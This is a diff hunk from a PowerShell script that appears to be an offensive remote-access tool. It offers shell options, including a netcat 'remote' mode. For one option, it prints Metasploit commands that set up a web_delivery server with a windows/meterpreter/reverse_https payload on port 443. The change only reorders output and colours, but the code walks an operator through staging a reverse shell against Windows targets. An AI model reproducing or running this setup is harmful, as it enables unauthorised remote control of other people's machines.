@@ -389,12 +389,13 @@ if($Language -in 'Spanish') {
 	Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'remote' ; sleep -milliseconds 2500 }
 
         if($shell -like '4'){ $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 
-	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-	Write-Host ; Write-host "$txt54" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt63"
-	Write-Host ; Write-host "use exploit/multi/script/web_delivery" ; Write-host "set SRVHOST 0.0.0.0" ; Write-host "set SRVPORT 8443"
-        Write-host "set SSL true" ; Write-host "set target 2" ; Write-host "set payload windows/meterpreter/reverse_https" ; Write-host "set LHOST 0.0.0.0"
-	Write-host "set LPORT 443" ; Write-host "set URIPATH $metarandom" ; Write-host "run -j" ; Write-Host
-	$Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
+	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
+	Write-host "$txt54" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
+	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
+	Write-host "set SRVHOST 0.0.0.0" ; Write-host "set SRVPORT 8443" ; Write-host "set SSL true" ; Write-host "set target 2"
+        Write-host "set payload windows/meterpreter/reverse_https" ; Write-host "set LHOST 0.0.0.0"
+	Write-host "set LPORT 443" ; Write-host "set URIPATH $metarandom" ; Write-host "run -j"
+	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
         if($shell -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}
